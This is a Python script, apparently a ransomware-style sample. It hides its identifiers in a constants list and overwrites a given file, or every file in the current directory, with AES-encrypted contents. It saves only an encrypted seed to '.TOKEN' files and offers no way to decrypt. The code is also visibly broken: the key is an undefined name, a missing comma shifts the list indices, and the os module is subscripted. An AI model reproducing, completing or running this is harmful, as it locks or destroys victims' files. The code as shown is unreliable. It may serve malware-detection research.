"""This file is the file with simple shared key encryption. We also don't include any obfuscation"""

import os
import random
import sys
from Crypto.Util.Padding import pad
from Crypto.Util.Padding import unpad
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP

constants = [get_random_bytes, 100, 50, 32, 79, pad, "delete", "uninstall", unpad,  # 8
             "install", "cmd", RSA, "sys", 500, 250, AES, "terminate", random, 500,  # 18
             "seed", "new", "old", "https", "connect", "random", "1000", str, "all", "encrypt", "lower"  # 29
             "listdir", "isfile", "randbytes",  # 32
             ]


constants[17].seed(constants[0](constants[3]))

KEY = INSECURE_ENCRYPTION_KEY

seed_cipher = constants[15].new(KEY, constants[15].MODE_CBC)


def processFile(path):
    if path.lower() == constants[27]:

        files = [f for f in os[constants[30]](
            ".") if os.path[constants[31]](f)]
        for f in files:
            seed = constants[17].randbytes(constants[3])
            constants[17].seed(seed)
            encrypted_seed = seed_cipher.encrypt(
                constants[5](seed, constants[15].block_size))
            cipher = constants[15].new(
                constants[17].randbytes(32), constants[15].MODE_CBC)
            with open(f, "r+b") as f:
                contents = f.read()

                encrypted = cipher.encrypt(
                    pad(contents, constants[15].block_size))
                f.seek(0)
                f.write(encrypted)

                with open(f"{path}.TOKEN", "w+") as f:
                    f.write(str(encrypted_seed))
        return

    seed = constants[17].randbytes(32)
    constants[17].seed(seed)
    encrypted_seed = seed_cipher.encrypt(
        pad(seed, constants[15].block_size))
    cipher = constants[15].new(
        constants[17].randbytes(32), constants[15].MODE_CBC)
    with open(path, "r+b") as f:
        contents = f.read()

        encrypted = cipher.encrypt(
            pad(contents, constants[15].block_size))
        f.seek(0)
        f.write(encrypted)

        with open(f"{path}.TOKEN", "w+") as f:
            f.write(str(encrypted_seed))


def main(args):
    cmdArgs = args[1::]
    cmdArgLen = len(cmdArgs)
    print(cmdArgs, cmdArgLen)
    if cmdArgLen < 1:
        print("usage: ./R2.py [input]")
        return

    processFile(cmdArgs[0])


if __name__ == "__main__":
    main(sys.argv)
